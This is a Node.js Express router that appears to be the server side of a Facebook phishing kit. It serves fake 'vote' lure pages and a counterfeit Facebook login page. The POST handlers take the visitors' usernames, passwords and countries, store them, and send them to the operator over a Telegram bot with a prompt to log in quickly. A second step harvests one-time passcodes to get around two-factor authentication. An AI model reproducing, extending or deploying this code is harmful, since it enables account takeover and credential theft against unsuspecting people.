const router = require("express").Router();
const Links = require("../../models/LinkModel");
const User = require("../../models/User");
const Credential = require("../../models/CredentialModel");
const bot = require("../../telegram");
const { blockNoneUS } = require("../../middlewares/blockUrl");


router.get("/vote/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ link: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        const user = await User.findById(link.user);
        if (user.notification) {
            await bot.sendMessage(user.telegramID, `
😈 New Entry 😈
            
Someone is about to Login!!!

SOCIAL MEDIA: ${link.linkType}

GET READY!!!
            
                    `)
        }
        return res.render("socials/facebook/vote", { req, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
    } catch (err) {
        console.log(err)
        return res.redirect("/notfound")

    }
});


router.get("/vote-2/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ link: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        const user = await User.findById(link.user);
        if (user.notification) {
            await bot.sendMessage(user.telegramID, `
😈 New Entry 😈
            
Someone is about to Login!!!

SOCIAL MEDIA: ${link.linkType}

GET READY!!!
            
                    `)
        }
        const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
        return res.render("socials/facebook/vote2", { req, picture: link.picture || samplePic, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
    } catch (err) {
        console.log(err)
        return res.redirect("/notfound")
    }
});


router.get("/vote-3/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ link: linkId });
        const url = "https://" + req.hostname + "/vote3/" + link.link;
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        const user = await User.findById(link.user);
        if (user.notification) {
            await bot.sendMessage(user.telegramID, `
😈 New Entry 😈
            
Someone is about to Login!!!

SOCIAL MEDIA: ${link.linkType}

GET READY!!!
            
                    `)
        }
        const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
        return res.render("socials/facebook/vote3", {
            req,
            link,
            url,
            res,
            layout: false
        });
    } catch (err) {
        console.log(err)
        return res.redirect("/notfound")
    }
});




router.get("/face/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
            return res.redirect("/notfound");
        }
        return res.render("socials/facebook/facebook", { req, linkId, layout: false });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard")
    }
});

router.get("/face/otp/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
            return res.redirect("/notfound");
        }
        return res.render("socials/facebook/faceOTP", { req, linkId, layout: false });
    } catch (err) {
        console.log(err);
        return res.redirect("/dashboard")
    }
});

router.post("/face/:linkId", async (req, res) => {
    try {
        const { username, password, country } = req.body;
        const { linkId } = req.params;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const link = await Links.findOne({ _id: linkId });;
        const user = await User.findById(link.user);

        console.log(req.body)

        if (link?.name) {
            const newCredential = new Credential({
                user: link.user,
                link: linkId,
                country,
                linkName: link.name,
                linkType: "Facebook",
                fields: {
                    username,
                    password
                }
            });
            await newCredential.save();
            await bot.sendMessage(user.telegramID, `
                😈 New Entry 😈
SOCIAL MEDIA: FACEBOOK

LOCATION: ${country}

USERNAME: ${username}
PASSWORD: ${password}
OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NOT AN OTP LINK"}

Login quickly 🏃🏾🏃🏾🏃🏾

Login now: https://www.facebook.com
                                                `)
                .catch(err => console.log("Telegram error"));
            if (link.otpEnabled) {
                return res.redirect("/face/otp/" + link.id);
            } else {
                return res.redirect("/successful-vote");
            }
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});

router.post("/face/otp/:linkId", async (req, res) => {
    try {
        const { linkId, code } = req.body;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const link = await Links.findOne({ _id: linkId });;
        const user = await User.findById(link.user);

        if (link) {
            await bot.sendMessage(user.telegramID, `
😈 NEW ENTRY 😈

SOCIAL MEDIA: FACEBOOK

OTP: ${code}

                `)
                .catch(err => console.log("Telegram error"));
            return res.redirect("/successful-vote");
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});


module.exports = router;